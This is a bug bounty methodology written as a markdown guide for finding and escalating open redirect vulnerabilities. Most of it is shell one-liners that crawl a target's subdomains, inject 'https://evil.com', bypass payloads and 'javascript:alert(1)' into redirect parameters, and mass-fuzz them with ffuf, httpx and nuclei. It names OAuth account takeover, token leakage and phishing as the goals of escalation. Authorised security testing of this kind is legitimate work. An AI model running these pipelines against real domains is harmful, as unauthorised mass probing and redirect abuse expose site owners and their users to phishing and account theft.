# 🧹first Remove Noisy Parameters (Clean Recon Pipeline)

### 📥 Input file

```
xssab_clean.txt  any file ------------
```

---

## 1️⃣ Remove common tracking & analytics noise

Create a noise parameter list:

```bash
cat > noise_params.txt << 'EOF'
utm_
fbclid
gclid
msclkid
ref
referer
source
campaign
analytics
tracking
pixel
session
cookie
browser
device
country
ip
AS
nt_
t_
s_server_time
env
userEnv
cksz
EOF
```

Filter them out:

```bash
grep -vi -f noise_params.txt xssab_clean.txt > step1_no_noise.txt
```

---

## 2️⃣ Normalize parameter values (keep only parameter names)

This helps spot **vulnerable params** easily:

```bash
sed 's/=[^&]*/=FUZZ/g' step1_no_noise.txt | sort -u > step2_normalized.txt
```

---

## 3️⃣ Keep only open-redirect style parameters 🎯

Create redirect parameter list:

```bash
cat > redirect_params.txt << 'EOF'
redirect
redir
url
uri
next
dest
destination
continue
return
returnto
return_url
callback
goto
out
forward
view
to
target
r
u
EOF
```

Filter redirect-like URLs:

```bash
grep -Ei "$(paste -sd '|' redirect_params.txt)" step2_normalized.txt > step3_redirect_candidates.txt
```

---

## 4️⃣ Remove obvious non-attack endpoints (SWF / tracking)

```bash
grep -vE '/swf/|/track/|thumbnail|boomerang|rum' step3_redirect_candidates.txt > final_redirects.txt
```

---

## 5️⃣ (Optional) Extract only parameter names (for manual testing)

```bash
awk -F'[?&]' '{for(i=2;i<=NF;i++) print $i}' final_redirects.txt \
| cut -d= -f1 | sort -u
```

## ✅ Final Output

📄 **final_redirects.txt**

```
Clean, low-noise, open-redirect candidates
```

---

## 🚀 Test for Open Redirect

```bash
qsreplace 'https://evil.com' < final_redirects.txt
```

# Open Redirect Automation – Bug Bounty Methodology

> **Private Bug Bounty Workflow**
> End-to-end automation for discovering, validating, fuzzing, and escalating **Open Redirect** vulnerabilities.

## 1️⃣ Overview

Open Redirect vulnerabilities can often be **chained** into higher-impact issues such as:

* OAuth account takeover
* Token leakage
* Phishing
* Client-side XSS (via `javascript:` or malformed schemes)

This methodology focuses on **automation-first discovery**, followed by **manual validation and escalation**.


## 2️⃣ Requirements

### 🔧 Core Tools

```bash
gau
katana
urlfinder
hakrawler
uro
gf
qsreplace
httpx-toolkit
subfinder
ffuf
nuclei
curl
```

### 🔧 Optional Tools

```bash
Burp Suite
Loxs
```

## 3️⃣ URL Collection (Single Domain)

Collect URLs from multiple sources to maximize coverage.

```bash
echo target.com | gau > urls1.txt
echo target.com | katana -d 2 > urls2.txt
echo target.com | urlfinder -d target.com > urls3.txt
echo target.com | hakrawler > urls4.txt
```

## 4️⃣ Merge, Normalize & Deduplicate URLs

Normalize parameters and remove duplicates.

```bash
cat urls1.txt urls2.txt urls3.txt urls4.txt | uro | sort -u > final.txt
```

## 5️⃣ Open Redirect Parameter Discovery

### 🔍 Regex-Based Filtering

```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|desturl=|u=|location=" > redirect_params.txt
```

### ✅ GF Pattern (Recommended)

```bash
cat final.txt | gf redirect | uro | sort -u > redirect_params.txt
```

## 6️⃣ Basic Open Redirect Verification

Replace parameters and confirm reflection in redirect response.

```bash
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

## 7️⃣ Subdomain → URL → Redirect Scan (One-Liner)

Full pipeline from subdomain discovery to redirect detection.

```bash
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

## 8️⃣ Bypass Payload Fuzzing (Custom Payload List)

Test common bypass techniques using Loxs payloads.

```bash
cat redirect_params.txt | while read url; do
  cat loxs/payloads/or.txt | while read payload; do
    echo "$url" | qsreplace "$payload"
  done
done | httpx-toolkit -silent -fr -mr "google.com"
```

## 9️⃣ Mass Bypass Fuzzing (Multiple Subdomains)

```bash
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro |
while read url; do
  cat loxs/payloads/or.txt | while read payload; do
    echo "$url" | qsreplace "$payload"
  done
done | httpx-toolkit -silent -fr -mr "google.com"
```

## 🔟 FFUF Parameter + Payload Fuzzing (Burp Enabled)

Useful for **manual review** and **Burp interception**.

```bash
ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD \
-u "https://site.com/redirect.php?PARAM=PAYLOAD" \
-mc 301,302,303,307,308 \
-mr "Location: http://google.com" \
-x http://127.0.0.1:8080 -t 10
```

## 1️⃣1️⃣ CURL Mass Redirect Verification

Lightweight confirmation of redirect behavior.

```bash
cat redirect_params.txt | qsreplace "https://evil.com" | \
xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\\n" {}
```

## 1️⃣2️⃣ Nuclei Open Redirect Scan

Automated template-based detection.

```bash
nuclei -l subdomains.txt -t openRedirect.yaml -c 30
```

## 1️⃣3️⃣ Parameter Extraction for Loxs

Prepare clean parameter list for Loxs automation.

```bash
cat redirect_params.txt | sed 's/=.*/=/' | uro > final_loxs.txt
```

## 1️⃣4️⃣ Open Redirect → XSS Impact Escalation

Test for client-side execution via dangerous schemes.

```bash
cat redirect_params.txt | qsreplace "javascript:alert(1)" | httpx-toolkit -silent -fr
```

⚠️ **Note:** Many modern browsers mitigate this, but some legacy flows or mobile apps may still be affected.


## ⚡ 1️⃣5️⃣ Ultimate One-Command Pipeline

```bash
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro |
while read url; do
  cat loxs/payloads/or.txt | while read payload; do
    echo "$url" | qsreplace "$payload"
  done
done | httpx-toolkit -silent -fr -mr "google.com"
```
